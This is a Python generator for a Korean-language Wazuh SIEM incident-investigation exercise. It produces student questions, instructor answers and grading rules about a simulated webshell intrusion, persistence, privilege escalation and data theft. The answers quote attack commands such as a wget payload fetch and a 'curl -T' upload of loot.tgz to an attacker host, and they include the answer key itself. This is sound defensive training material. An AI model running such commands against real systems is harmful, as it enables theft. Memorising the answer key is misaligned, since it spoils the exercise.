#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Generate the mission bank from the dataset manifest so answers always match
# the currently-planted logs. Emits:
#   /opt/siem-lab/answers/mission_answer_key.md   (INSTRUCTOR - answers+evidence)
#   /opt/siem-lab/student/mission_sheet.md        (STUDENT - questions only)
import json, os, re

M  = json.load(open("/opt/siem-lab/answers/manifest.json", encoding="utf-8"))
S  = {s["id"]: s for s in M["steps"]}
AC = M["actors"]; AZ = M["accounts"]

def t(i):   return S[i]["time"]
def loc(i):
    s = S[i]
    return f'{s["file"]}:{s["line"]}' if s.get("file") else "(디스크 아티팩트)"
def tok(i): return S[i]["token"]

# --------------------------------------------------------------------------- #
# Question bank. Each: sec(필수/보너스) typ sl diff score q a ev wz [tool] [discuss]
# a/ev pull live values from the manifest so the key never drifts.
# --------------------------------------------------------------------------- #
Q = [
 # ===== 필수 구간 1~20 =====
 dict(sec="필수", typ="직접조회", sl="A", diff="하", score=3,
   q="스토리라인 A에서 공격자가 SSH 브루트포스 끝에 최초로 인증에 성공한 시각(KST)은?",
   a=f'{t("A1")}  (계정 {AZ["victim"]}, 출발지 {AC["attacker_main"]})',
   ev=f'auth.log 라인 {S["A1"]["line"]}  ·  토큰 `{tok("A1")}`',
   wz='data.srcip:"198.51.100.23" and rule.groups:authentication_success',
   tool="wazuh-alerts-* 에서 인증 성공 이벤트의 timestamp 확인"),
 dict(sec="필수", typ="직접조회", sl="A", diff="하", score=3,
   q="최초 침투에 사용된 공격자의 출발지 IP 주소는?",
   a=AC["attacker_main"],
   ev=f'auth.log 라인 {S["A1"]["line"]} (Accepted password ...)',
   wz='data.srcip:"198.51.100.23"',
   tool="auth.log의 Accepted/Failed password 라인"),
 dict(sec="필수", typ="직접조회", sl="A", diff="하", score=3,
   q="공격자가 웹 루트(/var/www/html)에 배치한 웹셸 파일의 이름은?",
   a="search.php  (/var/www/html/search.php)",
   ev=f'auth.log 라인 {S["A2"]["line"]} sudo cp 기록 · 디스크 아티팩트 /var/www/html/search.php',
   wz='full_log:"search.php"',
   tool="sudo 로그 / 웹 루트 디렉터리 확인"),
 dict(sec="필수", typ="직접조회", sl="A", diff="중", score=4,
   q="웹셸을 통해 GET cmd= 파라미터로 실행된 '첫 번째' 명령은 무엇인가?",
   a="id  (/search.php?cmd=id)",
   ev=f'access.log 라인 {S["A3"]["line"]} · 토큰 `{tok("A3")}`',
   wz='rule.id:100101 (웹셸 명령 실행 시도) → full_log 확인',
   tool="access.log에서 search.php?cmd= 검색"),
 dict(sec="필수", typ="직접조회", sl="A", diff="중", score=4,
   q="웹셸을 통해 wget으로 다운로드된 악성 파일이 저장된 경로는?",
   a="/tmp/.cache/kworker",
   ev=f'access.log 라인 {S["A4"]["line"]} (cmd=wget ...) · auditd comm="wget"',
   wz='full_log:"wget" AND full_log:"kworker"',
   tool="access.log의 cmd=wget 요청"),
 dict(sec="필수", typ="직접조회", sl="A", diff="중", score=4,
   q="공격자가 지속성(persistence) 확보를 위해 등록한 cron이 반복 실행하는 대상 명령은?",
   a="/tmp/.cache/kworker  (매분 * * * * * 및 @reboot)",
   ev=f'cron.log 라인 {S["A5_run"]["line"]} · /etc/cron.d/apache-backup',
   wz='full_log:"/tmp/.cache/kworker"',
   tool="cron.log에서 반복 실행되는 CMD 확인 (kworker는 커널 스레드명이니 전체 경로로 검색)"),
 dict(sec="필수", typ="직접조회", sl="A", diff="중", score=4,
   q="시스템 바이너리처럼 위장해 배치된 변조 파일의 전체 경로는?",
   a="/usr/bin/backup  (setuid 비트 설정, mtime이 주변 파일과 상이)",
   ev=f'auditd bin_tamper (audit.log 라인 {S["A6_audit"]["line"]}) · stat /usr/bin/backup',
   wz='rule.id:100113 (시스템 바이너리 변조)',
   tool="stat /usr/bin/backup, ls -la /usr/bin | grep backup"),
 dict(sec="필수", typ="판단", sl="A", diff="중", score=4,
   q="/usr/bin/backup 를 `strings`로 조사했을 때 드러나는 공격 흔적 문자열을 2개 이상 쓰시오.",
   a="connect-back 198.51.100.47:4444 / setuid: unable to set uid to 0 / /tmp/.cache/kworker / /root/.ssh/authorized_keys (2개 이상)",
   ev="strings /usr/bin/backup · Wazuh: full_log 에서 kworker / 198.51.100.47 확인 가능",
   wz='full_log:"kworker" or full_log:"198.51.100.47"',
   tool="Wazuh full_log 에서 kworker·198.51.100.47 확인 (또는 호스트 strings /usr/bin/backup)"),
 dict(sec="필수", typ="직접조회", sl="B", diff="중", score=4,
   q="공격자가 권한 상승(NOPASSWD)을 위해 생성한 파일의 경로는?",
   a="/etc/sudoers.d/webadmin",
   ev=f'auth.log 라인 {S["B1"]["line"]} (tee ...) · auditd priv_esc (audit.log 라인 {S["B1_audit"]["line"]})',
   wz='rule.id:100111 (sudoers.d 변경 / 권한 상승)',
   tool="auth.log의 sudo 명령, /etc/sudoers.d/ 확인"),
 dict(sec="필수", typ="교차확인", sl="A+B", diff="중", score=4,
   q="권한 상승(B)에 사용된 세션의 출발지가 최초 침투(A)와 동일 공격자인지 판단하고 근거를 쓰시오.",
   a=f'동일 공격자. A·B 모두 {AC["attacker_main"]} / {AZ["victim"]} 계정 세션에서 발생 (A→B 체인).',
   ev=f'A1 {loc("A1")}, B1 {loc("B1")} — 동일 IP/계정',
   wz='data.srcip:"198.51.100.23" 로 A·B 이벤트를 함께 확인',
   tool="두 사건의 IP/계정 비교"),
 dict(sec="필수", typ="직접조회", sl="E", diff="중", score=4,
   q="정보 유출 직전 공격자가 데이터를 압축해 만든 아카이브 파일의 경로는?",
   a="/tmp/loot.tgz",
   ev=f'access.log 라인 {S["E1"]["line"]} (cmd=tar ...) · auditd comm="tar"',
   wz='full_log:"loot.tgz" 또는 full_log:"tar"',
   tool="access.log의 cmd=tar 요청"),
 dict(sec="필수", typ="직접조회", sl="E", diff="중", score=4,
   q="압축본을 외부로 업로드(exfiltration)한 목적지 호스트 IP는?",
   a=f'{AC["attacker_alt"]}  (curl -T /tmp/loot.tgz http://{AC["attacker_alt"]}/up)',
   ev=f'access.log 라인 {S["E2"]["line"]} · 토큰 `{tok("E2")}`',
   wz='full_log:"curl" AND full_log:"loot.tgz"',
   tool="access.log의 cmd=curl -T 요청"),
 dict(sec="필수", typ="교차확인", sl="A+B+E", diff="상", score=6, discuss=True,
   q="최초 침투(A)→권한 상승(B)→정보 유출(E)로 이어지는 전체 공격 체인을 시간순으로 재구성하시오.",
   a=(f'{t("A1")} 침투 → {t("A2")} 웹셸 배치 → {t("A3")} 명령 실행 → {t("A4")} 페이로드 다운로드 → '
      f'{t("A5")} cron 지속성 → {t("A6")} 바이너리 변조 → {t("B1")} sudoers 권한상승 → '
      f'{t("E1")} 압축 → {t("E2")} 외부 유출. 전 과정 동일 공격자 {AC["attacker_main"]}/{AZ["victim"]}.'),
   ev="A1~E2 전체 (auth/access/cron/audit 교차)",
   wz='data.srcip:"198.51.100.23" 를 시간 오름차순 정렬',
   tool="여러 로그를 시간순으로 종합"),
 dict(sec="필수", typ="판단(오탐)", sl="D", diff="중", score=4,
   q=f'{t("D1")[11:16]}경 opsadmin 계정이 192.168.208.50에서 로그인 후 cron을 등록했다. 침해인가 정상 업무인가? 근거는?',
   a="정상 업무(미끼). 사내 LAN(192.168.208.50)의 관리자 계정 opsadmin이 정기 배포(deploy-nightly.sh) cron을 등록. 공격자 IP와 무관하며 대응 불필요.",
   ev=f'auth.log 라인 {S["D1"]["line"]}, cron.log 라인 {S["D2"]["line"]} (/etc/cron.d/deploy-nightly)',
   wz='data.srcip:"192.168.208.50" — 내부 관리자',
   tool="계정/출발지/작업 내용의 정상 여부 판단"),
 dict(sec="필수", typ="판단(오탐)", sl="F", diff="하", score=3,
   q="198.51.100.99에서 root 계정 로그인 반복 실패 후 무슨 일이 일어났는가? 대응이 필요한가?",
   a="계정 잠금(pam_faillock, 6회 실패). 성공 인증이 없어 방어가 정상 작동한 사례 — 대응 불필요(미끼).",
   ev=f'auth.log 라인 {S["F1"]["line"]} · 토큰 `{tok("F1")}`',
   wz='data.srcip:"198.51.100.99" — 성공 인증 없음 확인',
   tool="auth.log에서 성공 인증 유무 확인"),
 dict(sec="필수", typ="판단(오탐)", sl="C", diff="중", score=4,
   q="192.0.2.77에서 다수의 404 응답과 sqlmap User-Agent가 관측됐다. 이 활동의 성격과 대응 우선순위는?",
   a="웹 취약점 스캐너(sqlmap) 정찰. 실제 침해로 이어지지 않은 독립 노이즈 — 낮은 우선순위 모니터링(미끼).",
   ev=f'access.log 라인 {S["C1"]["line"]}~ · rule.id 100102',
   wz='rule.id:100102 (sqlmap 스캐너)',
   tool="access.log의 User-Agent와 응답코드"),
 dict(sec="필수", typ="직접조회", sl="A", diff="하", score=3,
   q="웹셸을 통한 명령 실행이 auditd에 기록될 때 사용된 감사 키(key)는?",
   a="webshell_exec",
   ev=f'audit.log 라인 {S["A3_audit"]["line"]} (comm="id", key="webshell_exec")',
   wz='full_log:"webshell_exec"',
   tool="wazuh-archives-* 에서 audit 로그의 key= 값 확인 (또는 호스트 ausearch -k)"),
 dict(sec="필수", typ="직접조회", sl="A", diff="중", score=4,
   q="cron 지속성 등록 행위가 auditd에 남긴 감사 키(key)는?",
   a="cron_persist",
   ev=f'audit.log 라인 {S["A5_audit"]["line"]}',
   wz='full_log:"cron_persist"',
   tool="wazuh-archives-* 에서 audit 로그의 key= 값 확인"),
 dict(sec="필수", typ="미끼식별(복수)", sl="종합", diff="상", score=6, discuss=True,
   q=("다음 다섯 출발지 중 '실제 대응이 필요한' 침해 관련만 모두 고르시오: "
      "① 198.51.100.23  ② 192.0.2.77  ③ 192.168.208.50  ④ 198.51.100.99  ⑤ 198.51.100.47"),
   a="① 198.51.100.23 (공격자 본체), ⑤ 198.51.100.47 (2차 hop·유출 목적지). "
     "② 스캐너 미끼, ③ 정상 관리자, ④ 잠긴 실패(방어 성공)는 대응 불필요.",
   ev="A/E vs C/D/F 종합",
   wz='data.srcip:"198.51.100.23" or full_log:"198.51.100.47"',
   tool="다섯 IP 각각의 로그를 비교"),
 dict(sec="필수", typ="교차확인", sl="A+D", diff="상", score=6, discuss=True,
   q="야간에 cron을 등록한 두 흐름(webadmin 경유 vs opsadmin)이 있다. 어느 쪽이 악성이고 어느 쪽이 정상인지 구분하고 근거를 쓰시오.",
   a="악성: A5 — 공격자 IP 세션에서 /tmp/.cache/kworker를 매분/@reboot 실행(apache-backup). "
     "정상: D2 — 관리자 opsadmin이 LAN에서 정기 배포(deploy-nightly.sh) 등록. 계정·출발지·작업 목적이 상이.",
   ev=f'A5 cron.log:{S["A5"]["line"]} vs D2 cron.log:{S["D2"]["line"]}',
   wz='cron 관련 이벤트를 srcip/계정별로 비교',
   tool="두 cron 등록의 계정·대상 비교"),

 # ===== 보너스 구간 21~ =====
 dict(sec="보너스", typ="직접조회", sl="A", diff="중", score=4,
   q="웹셸이 실행한 5개의 cmd= 명령을 관측된 순서대로 나열하시오.",
   a="id → whoami → uname -a → cat /etc/passwd → ss -tlnp",
   ev=f'access.log {S["A3"]["line"]}행부터 연속 · auditd webshell_exec',
   wz='rule.id:100101 을 시간순 정렬',
   tool="access.log의 search.php?cmd= 연속 요청"),
 dict(sec="보너스", typ="교차확인", sl="A", diff="상", score=6,
   q="A3의 웹셸 명령들이 auditd(execve)에도 남아 있는지 확인하고, 기록된 프로세스명(comm) 중 3개를 쓰시오.",
   a="예. comm=id / whoami / uname / cat / ss 중 3개 (key=webshell_exec)",
   ev="ausearch -k webshell_exec",
   wz='full_log:"webshell_exec" and full_log:"comm="',
   tool="wazuh-archives-* 에서 audit 로그의 comm= 값들 확인"),
 dict(sec="보너스", typ="직접조회", sl="E", diff="중", score=4,
   q="tar 압축(E1) 대상에 포함된 경로 2개를 쓰시오.",
   a="/var/www 와 /etc/passwd",
   ev=f'access.log 라인 {S["E1"]["line"]} (cmd=tar+czf+/tmp/loot.tgz+/var/www+/etc/passwd)',
   wz='full_log:"tar" AND full_log:"loot.tgz"',
   tool="access.log의 cmd=tar 파라미터"),
 dict(sec="보너스", typ="상관분석", sl="A+E", diff="상", score=6,
   q="공격 체인의 시작(A1)부터 정보 유출 완료(E2)까지 걸린 대략적인 시간은?",
   a=f'{t("A1")[11:16]} ~ {t("E2")[11:16]} ≈ 약 40분',
   ev="A1, E2 타임스탬프 차",
   wz='data.srcip:"198.51.100.23" 최초/최종 이벤트 시각',
   tool="A1과 E2 시각 비교"),
 dict(sec="보너스", typ="Wazuh", sl="A", diff="하", score=3,
   q="Wazuh 대시보드에서 rule.id 100101 알림은 무엇을 의미하며, 몇 건이 관측되는가?",
   a="웹셸 명령 실행 시도(URL의 cmd= 파라미터). 건수는 대시보드 집계값으로 채점(사전 로그 기준 약 8건 + 데모 클릭분).",
   ev="local_rules.xml 100101",
   wz='rule.id:100101',
   tool="Wazuh Discover, rule.id:100101"),
 dict(sec="보너스", typ="Wazuh", sl="종합", diff="중", score=4,
   q="archives 인덱스에서 srcip 198.51.100.23 으로 필터하면 어떤 로그 소스(파일)들이 함께 검색되는가?",
   a="/var/log/apache2/access.log, /var/log/auth.log, /var/log/audit/audit.log (동일 공격자가 웹·인증·프로세스 로그에 걸침)",
   ev="wazuh-archives-* location 필드",
   wz='data.srcip:"198.51.100.23"',
   tool="wazuh-archives-* Discover"),
 dict(sec="보너스", typ="판단", sl="F", diff="하", score=3,
   q="스토리라인 F에서 잠긴 계정과 잠금이 발동한 실패 횟수 임계치는?",
   a="root 계정, 6회 연속 실패",
   ev=f'auth.log 라인 {S["F1"]["line"]}',
   wz='data.srcip:"198.51.100.99"',
   tool="auth.log pam_faillock 라인"),
 dict(sec="보너스", typ="교차확인", sl="A", diff="중", score=4,
   q="웹셸 파일(search.php)의 배치 시각과 access.log의 첫 cmd= 요청 시각의 선후 관계를 밝히시오.",
   a=f'배치(A2, {t("A2")}) 이후 명령 실행(A3, {t("A3")}) — 배치가 먼저.',
   ev=f'A2 {loc("A2")} < A3 {loc("A3")}',
   wz='stat /var/www/html/search.php 와 access.log 시각 비교',
   tool="mtime과 로그 시각 비교"),
 dict(sec="보너스", typ="미끼식별", sl="D", diff="중", score=4,
   q="D(정상 관리자)와 A(공격자)의 cron 파일 경로를 각각 쓰고, 어느 것이 악성인지 판단하시오.",
   a="정상: /etc/cron.d/deploy-nightly (opsadmin). 악성: /etc/cron.d/apache-backup (webadmin/kworker).",
   ev="artifacts: deploy-nightly vs apache-backup",
   wz='full_log:"cron.d" 또는 각 파일 FIM 이벤트',
   tool="/etc/cron.d/ 두 파일 비교"),
 dict(sec="보너스", typ="직접조회", sl="B", diff="중", score=4,
   q="sudoers.d 백도어가 부여하는 권한의 핵심 키워드는 무엇이며, 어떤 위험을 의미하는가?",
   a="NOPASSWD:ALL — 비밀번호 없이 모든 sudo 명령 실행(사실상 상시 root). 지속적 권한 유지.",
   ev=f'auth.log 라인 {S["B1"]["line"]} sudo COMMAND (webadmin ALL=(ALL) NOPASSWD:ALL)',
   wz='full_log:*NOPASSWD*',
   tool='대문자·특수문자(:)가 든 값은 와일드카드로: full_log:*NOPASSWD* (sudo 명령에 남은 sudoers 내용)'),
 dict(sec="보너스", typ="상관분석", sl="종합", diff="상", score=6, discuss=True,
   q="이 데이터셋에서 '알림이 떴지만 대응이 불필요한' 사례를 모두 찾고, 각각 왜 오탐/저위험인지 설명하시오.",
   a="C(sqlmap 스캐너: 정찰, 침해 미연결), D(정상 관리자 배포), F(로그인 실패 후 잠금: 방어 성공). "
     "알림 발생이 곧 대응 필요를 뜻하지 않음 — 우선순위 선별이 핵심.",
   ev="C1/D1-D2/F1",
   wz='rule.id:100102 or data.srcip:"192.168.208.50" or data.srcip:"198.51.100.99"',
   tool="세 미끼 스토리라인 종합"),
 dict(sec="보너스", typ="Wazuh", sl="A", diff="중", score=4,
   q="라이브 데모의 '의심스러운 검색 요청' 버튼을 누른 뒤 Wazuh에서 어떤 rule.id 알림이 새로 발생하는가?",
   a="rule.id 100101 (웹셸 cmd= 명령 실행 시도). 출발지 203.0.113.66 로 관측.",
   ev="demo /demo/suspect → access.log → rule 100101",
   wz='data.srcip:"203.0.113.66" AND rule.id:100101',
   tool="데모 버튼 클릭 후 Discover 새로고침"),
 dict(sec="보너스", typ="직접조회", sl="A", diff="하", score=3,
   q="웹 루트 파일 생성(웹셸 배치)이 auditd에 남긴 감사 키(key)는?",
   a="webroot_write",
   ev=f'audit.log 라인 {S["A2_audit"]["line"]}',
   wz='full_log:"webroot_write"',
   tool="ausearch -k webroot_write"),
 dict(sec="보너스", typ="상관분석", sl="종합", diff="상", score=6, discuss=True,
   q="공격자(198.51.100.23)와 2차 hop(198.51.100.47)의 관계를 로그 근거와 함께 설명하시오.",
   a="198.51.100.23은 침투·웹셸·권한상승 세션의 출발지. 198.51.100.47은 페이로드 다운로드 서버(A4) 겸 유출 목적지(E2). 동일 공격 인프라(같은 /24).",
   ev="A4(다운로드), E2(업로드) 목적지 = .47",
   wz='full_log:"198.51.100.47"',
   tool="A4/E2의 목적지 IP 확인"),
 dict(sec="보너스", typ="직접조회", sl="A", diff="중", score=4,
   q="웹셸을 웹 루트로 옮긴 sudo 명령의 '원본 경로 → 대상 경로'를 쓰시오.",
   a="/tmp/search.php → /var/www/html/search.php  (sudo /bin/cp)",
   ev=f'auth.log 라인 {S["A2"]["line"]} · 토큰 `{tok("A2")}`',
   wz='full_log:"cp" AND full_log:"search.php"',
   tool="auth.log의 sudo COMMAND= 라인"),
 dict(sec="보너스", typ="상관분석", sl="종합", diff="상", score=6, discuss=True,
   q="MITRE ATT&CK 관점에서 (1)초기 접근 (2)지속성 (3)유출 단계에 해당하는 사건을 이 데이터셋에서 하나씩 짝지으시오.",
   a="초기 접근: A1 SSH 브루트포스(T1110). 지속성: A5 cron(T1053) 및 B1 sudoers(T1548.003). 유출: E2 curl 업로드(T1041).",
   ev="A1 / A5·B1 / E2",
   wz='rule.id:100101 or rule.id:100111 or rule.id:100112',
   tool="각 사건의 목적(전술) 분류"),
]

# --------------------------------------------------------------------------- #
# Auto-grading rules, keyed by question number (필수 1..20 then 보너스 21..).
# Modes: contains(any accept token) | all(all tokens) | any_n(>=n tokens) |
#        word(word-boundary any) | manual(instructor grades).
def _hhmm(i): return S[i]["time"][11:16]
GRADE = {
    1:  ("contains", [_hhmm("A1")]),
    2:  ("contains", ["198.51.100.23"]),
    3:  ("contains", ["search.php"]),
    4:  ("word",     ["id", "cmd=id"]),
    5:  ("contains", ["/tmp/.cache/kworker", "kworker"]),
    6:  ("contains", ["/tmp/.cache/kworker", "kworker"]),
    7:  ("contains", ["/usr/bin/backup"]),
    8:  ("any_n", 2, ["connect-back", "198.51.100.47", "setuid", "authorized_keys", "kworker"]),
    9:  ("contains", ["sudoers.d"]),
    10: ("manual",),
    11: ("contains", ["loot.tgz"]),
    12: ("contains", ["198.51.100.47"]),
    13: ("manual",),
    14: ("manual",),
    15: ("manual",),
    16: ("manual",),
    17: ("contains", ["webshell_exec"]),
    18: ("contains", ["cron_persist"]),
    19: ("all",      ["198.51.100.23", "198.51.100.47"]),
    20: ("manual",),
    21: ("any_n", 4, ["id", "whoami", "uname", "cat", "ss"]),
    22: ("any_n", 3, ["id", "whoami", "uname", "cat", "ss"]),
    23: ("any_n", 2, ["/var/www", "passwd"]),
    24: ("contains", ["40"]),
    25: ("manual",),
    26: ("any_n", 2, ["access", "auth", "audit"]),
    27: ("all",      ["root", "6"]),
    28: ("manual",),
    29: ("any_n", 2, ["deploy-nightly", "apache-backup"]),
    30: ("contains", ["nopasswd"]),
    31: ("manual",),
    32: ("contains", ["100101"]),
    33: ("contains", ["webroot_write"]),
    34: ("manual",),
    35: ("all",      ["/tmp/search.php", "/var/www/html/search.php"]),
    36: ("manual",),
}

def grade_entry(qno):
    g = GRADE.get(qno, ("manual",))
    mode = g[0]
    if mode == "any_n":
        return {"mode": "any_n", "n": g[1], "accept": g[2]}
    if mode == "manual":
        return {"mode": "manual"}
    return {"mode": mode, "accept": g[1]}

# --- pedagogical insight per storyline (왜 의심? 어떤 관점?) ------------------ #
SL_INSIGHT = {
 "A": ("정상 웹 접근(200/304)이 대부분인 access.log에 GET 파라미터로 cmd=... 가 섞여 들어오면 "
       "웹셸을 통한 원격 명령 실행을 의심해야 합니다. 인증 로그의 '다수 Failed → Accepted'(브루트포스 성공)를 "
       "시작점으로 잡고, 같은 출발지 IP를 따라 웹셸 배치→명령 실행→페이로드 다운로드→cron 지속성→바이너리 변조 순으로 "
       "시간축을 이어 붙이며 공격 흐름을 재구성하는 것이 핵심 관점입니다."),
 "B": ("권한 상승은 '인증 성공 이후'에 sudoers.d 생성·새 계정·그룹 변경 형태로 나타납니다. "
       "야간 등 비정상 시간대에, 앞서 침투한 공격자와 '동일 출발지 IP/계정' 세션에서 발생했다면 강한 의심 신호입니다. "
       "auditd priv_esc 키와 auth.log의 sudo 명령을 교차 확인하세요."),
 "C": ("짧은 간격의 다수 404 + sqlmap 등 스캐너 User-Agent + 방화벽(UFW) 다수 포트 차단은 '정찰(스캔)' 신호입니다. "
       "실제 침해(성공 응답·후속 행위)로 이어졌는지가 판단 기준이며, 이어지지 않았다면 저위험으로 분류합니다. "
       "알림이 떴다고 모두 대응하는 게 아니라 우선순위를 가려내는 관점이 중요합니다."),
 "D": ("정상 관리자의 야간 배포는 '공격처럼 보이지만 정상'인 대표 오탐 사례입니다. "
       "계정(관리자)·출발지(사내 LAN)·작업 목적(정기 배포 cron)이 정상 업무와 일치하는지를 근거로 판단하세요. "
       "공격자 IP·비정상 계정과의 '차이'를 짚어내는 것이 오탐을 걸러내는 관점입니다."),
 "E": ("정보 유출은 대개 침해의 마지막 단계로, 파일 압축(tar) 후 외부로 전송(curl -T)하는 흔적으로 나타납니다. "
       "응답 크기가 비정상적으로 크거나 외부 목적지로의 업로드가 보이면 유출을 의심하고, "
       "앞선 침투·권한상승과 '동일 공격자'로 이어지는 체인인지 확인하세요."),
 "F": ("반복 로그인 실패 후 계정 잠금(pam_faillock)은 '방어가 작동한' 사례입니다. 성공 인증이 없으므로 "
       "실제 침해가 아니며 대응 불필요로 분류합니다. '실패만 있는가, 성공이 섞였는가'를 반드시 확인하는 관점이 중요합니다."),
 "종합": ("여러 스토리라인이 한 로그 뭉치에 섞여 있습니다. 알림·로그를 IP·계정·시간으로 묶어 "
        "'대응이 필요한 실제 침해'와 '정찰/정상업무/방어성공 같은 미끼'를 구분하는 것이 실무 SOC의 핵심 역량입니다."),
}
def insight_for(sl):
    return SL_INSIGHT.get(sl[0] if sl and sl[0] in SL_INSIGHT else "종합", SL_INSIGHT["종합"])

# --- keep the Wazuh hint a VALID query (strip any trailing prose) ------------ #
def clean_query(wz):
    m = re.match(r'^([\w.\-]+:\s*("[^"]*"|[\w.\-*]+)'
                 r'(\s+(and|or|AND|OR)\s+[\w.\-]+:\s*("[^"]*"|[\w.\-*]+))*)', (wz or "").strip())
    return m.group(1) if m else (wz or "").strip()

# --- expected answer format (reduces input errors) --------------------------- #
def derive_fmt(g):
    mode = g["mode"]; acc = g.get("accept", [])
    a0 = acc[0] if acc else ""
    if mode == "manual": return "서술형 · 판단과 근거를 함께 작성"
    if any(re.match(r"^\d+\.\d+\.\d+\.\d+$", a) for a in acc): return "IP 주소 · xxx.xxx.xxx.xxx"
    if re.match(r"^\d{1,2}:\d{2}", a0): return "시각 · HH:MM:SS  (예: 04:38:17)"
    if any("/" in a for a in acc): return "경로 · /xxx/xxx/xxx  (예: /tmp/.cache/파일)"
    if any(("." in a and re.match(r"^[\w.-]+\.\w{1,6}$", a)) for a in acc):
        return "파일명.확장자 · xxxx.xxx  (예: 이름.php)"
    if mode == "any_n": return "여러 개 · 쉼표(,)로 구분해 입력"
    if mode == "all":   return "해당 값들을 모두 포함해 입력"
    return "단어 · 짧은 답"


DIFF_SCORE = {"하": 10, "중": 15, "상": 20}   # base score by difficulty

def render():
    for q in Q:                               # scale base scores by difficulty
        q["score"] = DIFF_SCORE.get(q["diff"], 10)
    req = [q for q in Q if q["sec"] == "필수"]
    bon = [q for q in Q if q["sec"] == "보너스"]

    intro_student = f"""# 실시간 위협 탐지 실습 — 미션 문제지 (학생용)

> 대상 환경: Wazuh SIEM 단일 노드 (이 VM). 사전 침해 로그가 적재되어 있습니다.
> **정답은 이 문서에 없습니다.** Wazuh 대시보드와 로그를 근거로 스스로 찾으세요.

## Wazuh로 시작하기 (지식이 없어도 됩니다)
1. 브라우저에서 **https://<이 VM의 IP>** 접속 → 계정 **admin** 으로 로그인.
2. 왼쪽 메뉴 **Discover** → 인덱스 패턴을 **wazuh-alerts-*** (탐지 알림) 또는
   **wazuh-archives-*** (모든 로그 검색)로 선택.
3. 시간 범위는 이미 넓게(최근 1년) 설정돼 있어 사전 로그가 모두 보입니다.
   비어 보이면 우측 상단 시간 범위를 **Last 1 year** 로 바꾸세요.
4. 검색창에 아래 각 문항의 '권장 쿼리/도구'를 입력해 근거를 찾습니다.
   예) `data.srcip:"198.51.100.23"`  ,  `rule.id:100101`  ,  `full_log:"search.php"`

## 채점/진행 안내
- **필수 구간(1~{len(req)})** 을 먼저 푸세요. 핵심 개념을 모두 거치도록 구성돼 있습니다.
- **보너스 구간({len(req)+1}~{len(req)+len(bon)})** 은 시간이 남는 조를 위한 심화 문항입니다.
- [조별토의] 표시 문항은 조원과 함께 근거를 정리해 발표를 준비하세요.

---
"""
    def q_student(n, q):
        d = " · ".join(x for x in [f"[{q['sec']}]", f"[{q['typ']}]", f"스토리라인 {q['sl']}",
                                   f"난이도 {q['diff']}", f"{q['score']}점",
                                   "🗣️조별토의" if q.get("discuss") else ""] if x)
        return (f"**{n}. {q['q']}**\n\n"
                f"　`{d}`\n\n"
                f"　권장 도구/쿼리: {q.get('tool','')}\n\n"
                f"　답: ______________________________________________\n\n")

    def q_key(n, q):
        d = " · ".join([f"[{q['sec']}]", f"[{q['typ']}]", f"SL {q['sl']}",
                        f"{q['diff']}", f"{q['score']}점"] +
                       (["🗣️조별토의"] if q.get("discuss") else []))
        return (f"**{n}. {q['q']}**\n\n"
                f"　`{d}`\n\n"
                f"　**정답:** {q['a']}\n\n"
                f"　**증적:** {q['ev']}\n\n"
                f"　**Wazuh 쿼리:** `{clean_query(q['wz'])}`\n\n---\n")

    # ---- student sheet ----
    st = [intro_student, "## 필수 구간\n"]
    n = 1
    for q in req: st.append(q_student(n, q)); n += 1
    st.append("\n## 보너스 구간 (시간 여유 시)\n")
    for q in bon: st.append(q_student(n, q)); n += 1

    total_req = sum(q["score"] for q in req)
    total_bon = sum(q["score"] for q in bon)
    key = [f"""# 실시간 위협 탐지 실습 — 정답 키 (강사용, 대외비)

> **주의: 이 파일은 학생에게 배포하지 마십시오.** 배포는 학생용 문제지(mission_sheet.md)만.
> 데이터셋 생성 시각: {M['generated_at']} · 스토리라인 {''.join(M['storylines_present'])}
> 체인: {M['chain']} · 미끼: {M['decoys']}

## 배점 요약
- 필수 {len(req)}문항 = {total_req}점 · 보너스 {len(bon)}문항 = {total_bon}점 · 총 {total_req+total_bon}점
- 난이도 배점 기준(예): 하 3점 / 중 4점 / 상 6점
- debrief는 필수 구간(1~{len(req)}) 기준으로 진행 권장.

## 미끼(오탐/저위험) 검증 노트 — 강사 참고
- **C(스캐너)**: rule.id 100102 로 '탐지는 됨'. 다만 실제 침해로 이어지지 않은 정찰 → 저위험. 정답은 '대응 불필요/모니터링'.
- **D(정상 관리자)**: 공격용 커스텀 룰(cmd=/priv_esc/cron_persist)을 **발생시키지 않음**. 배치 스크립트가 auditd 중지 상태에서 /etc/cron.d/ 아티팩트를 생성하므로 cron_persist 오탐이 없음(확인됨: cron_persist·priv_esc·bin_tamper 각 1건=공격자 전용). 정상 로그인/cron 편집의 저수준 이벤트만 존재.
- **F(계정 잠금)**: 인증 실패 알림은 뜨지만 성공 인증 없음 → 방어 성공. 정답은 '대응 불필요'.
- 즉 '알림 유무'가 아니라 '조사 후 대응 필요성'으로 판단하도록 설계됨.

## 역할(배역) 매핑 (정답 판정 참고)
| 역할 | 값 |
|---|---|
| 공격자(본체) | {AC['attacker_main']} |
| 2차 hop/유출 목적지 | {AC['attacker_alt']} |
| 데모 의심요청 출발지 | {AC['demo_suspect']} |
| 스캐너(미끼) | {AC['scanner']} |
| 정상 관리자(미끼) | {AC['admin_lan']} ({AZ['sysadmin']}) |
| 잠긴 실패(미끼) | {AC['lockout_src']} |
| 피해 계정 | {AZ['victim']} |

---
## 필수 구간 정답
"""]
    n = 1
    for q in req: key.append(q_key(n, q)); n += 1
    key.append("\n## 보너스 구간 정답\n")
    for q in bon: key.append(q_key(n, q)); n += 1

    # ---- machine-gradable spec for the student portal (server-side only) ----
    ordered = req + bon
    spec = {"generated_at": M["generated_at"], "total": len(ordered),
            "required": len(req), "bonus": len(bon), "questions": []}
    for i, q in enumerate(ordered, start=1):
        wzq = clean_query(q["wz"])
        # progressive hints (paid): method -> exact query -> evidence location
        hints = [
            f"[방법] {q.get('tool','로그를 살펴보세요')}",
            f"[조회] Wazuh 쿼리: {wzq}",
            f"[근거 위치] {q['ev']}",
        ]
        g = grade_entry(i)
        spec["questions"].append({
            "qno": i, "section": q["sec"], "type": q["typ"], "sl": q["sl"],
            "diff": q["diff"], "score": q["score"], "discuss": bool(q.get("discuss")),
            "question": q["q"],
            "fmt": derive_fmt(g),             # expected answer format (input placeholder)
            "hints": hints,                   # served one-by-one via /api/hint (paid)
            "explain": {"answer": q["a"], "evidence": q["ev"], "wazuh": wzq,
                        "steps": hints, "insight": insight_for(q["sl"])},
            "answer": q["a"],                 # instructor reference
            "grade": g,
        })

    os.makedirs("/opt/siem-lab/student", exist_ok=True)
    with open("/opt/siem-lab/student/mission_sheet.md", "w", encoding="utf-8") as f:
        f.write("".join(st))
